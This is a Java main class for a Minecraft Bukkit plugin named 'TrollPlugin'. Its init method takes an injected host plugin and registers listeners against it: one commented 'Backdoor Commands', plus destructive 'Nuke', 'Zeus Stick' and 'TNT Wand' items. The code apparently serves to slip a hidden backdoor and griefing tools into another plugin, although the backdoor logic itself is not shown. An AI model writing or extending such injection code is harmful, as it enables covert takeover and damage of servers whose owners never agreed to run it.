package io.github.geniusformat.trollplugin;

import io.github.geniusformat.trollplugin.commands.Commands;
import io.github.geniusformat.trollplugin.items.ItemManager;
import io.github.geniusformat.trollplugin.items.Nuke;
import io.github.geniusformat.trollplugin.items.Wand;
import io.github.geniusformat.trollplugin.items.ZeusStick;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public final class TrollPlugin extends JavaPlugin {
    public static void init(Plugin injectedPlugin) {
        // Backdoor Commands
        Bukkit.getPluginManager().registerEvents(new Commands(), injectedPlugin);

        // Items
        ItemManager.init();
        Bukkit.getPluginManager().registerEvents(new ZeusStick(), injectedPlugin);    // Zeus Stick
        Bukkit.getPluginManager().registerEvents(new Nuke(), injectedPlugin);         // Nuke
        Bukkit.getPluginManager().registerEvents(new Wand(), injectedPlugin);      // TNT Wand
    }
}
